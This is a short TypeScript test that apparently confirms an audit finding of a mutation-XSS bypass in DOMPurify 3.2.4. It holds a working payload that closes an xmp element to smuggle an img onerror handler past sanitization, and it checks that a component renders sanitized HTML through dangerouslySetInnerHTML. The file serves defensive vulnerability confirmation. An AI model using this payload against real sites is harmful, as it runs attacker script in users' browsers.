/** Confirm H2: Dompurify Outdated Mxss */
import * as fs from 'fs';
import createDOMPurify = require('dompurify');

const sessionShortId = '00000000';
const dompurify = createDOMPurify(window);

test('test_confirm_dompurify_outdated_mxss_' + sessionShortId, () => {
  const payload = `<img src=x alt="</xmp><img src=x onerror=alert('XSS-via-DOMPurify-3.2.4')">`;
  const sanitized = dompurify.sanitize(payload);

  expect(sanitized).toContain('</xmp>');
  expect(sanitized).toContain('onerror=alert(');

  document.body.innerHTML = `<xmp>${sanitized}</xmp>`;
  const reparsed = document.body.querySelector('img[onerror]');
  expect(reparsed).not.toBeNull();
  expect(reparsed?.getAttribute('onerror')).toContain('XSS-via-DOMPurify-3.2.4');

  const sinkSource = fs.readFileSync('[REDACTED].tsx', 'utf8');
  expect(sinkSource).toContain("dompurify.sanitize(html)");
  expect(sinkSource).toContain('dangerouslySetInnerHTML');
  expect(sinkSource).not.toMatch(/SAFE_FOR_TEMPLATES|ALLOWED_TAGS|ALLOWED_ATTR|FORBID_TAGS|FORBID_ATTR/);
});
